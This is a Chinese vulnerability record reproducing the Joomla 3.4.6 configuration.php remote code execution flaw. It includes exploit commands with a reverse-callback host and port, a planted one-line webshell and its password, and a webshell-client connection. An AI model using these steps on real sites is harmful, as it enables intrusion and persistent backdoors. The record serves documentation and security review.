---
source: "hatch 补库批 20260928"
product: "Joomla3.0.0–3.4.6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla 3.4.6 - 'configuration.php' Remote Code Execution"
prerequisites: "来源所述条件，未列明部分仍待核：同222，认证与PHP/配置条件未列"
side_effects: "未执行；本文需注意的操作影响：configuration.php持久写shell需标副作用，不是一般无破坏验证"
source_status: "unknown"
id: "vw-145a31e5b7226c82c9e3ae28"
entity_id: "ve-145a31e5b7226c82c9e3ae28"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：同222，认证与PHP/配置条件未列

- **证据待核（1）**：与222同文脚本步骤，区别在图片与末尾蚁剑图，保留本篇附图后合并。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（2）**：脚本仓库URL有转义连字符污染；只显示Vulnerable没有独立证明。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **操作与副作用边界（3）**：configuration.php持久写shell需标副作用，不是一般无破坏验证。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Joomla 3.4.6 configuration.php 远程代码执行

一、漏洞简介
------------

Joomla 3.4.6 - \'configuration.php\' Remote Code Execution

二、影响范围
------------

Joomla 3.0.0 至 3.4.6

三、复现过程
------------

https://github.com/ianxtianxt/Joomla-3.4.6\-\--configuration.php-Remote-Code-Execution

### 脚本验证

验证：

    python3 test.py -t http://127.0.0.1:8080/

![](./.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId25.png)

显示"Vulnerable"证明存在漏洞

利用：

    python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121

![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId26.png)

执行成功

并在"configuration.php"写入**随机密码**的一句话木马![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId27.png)上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi

蚁剑链接测试

![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId28.png)
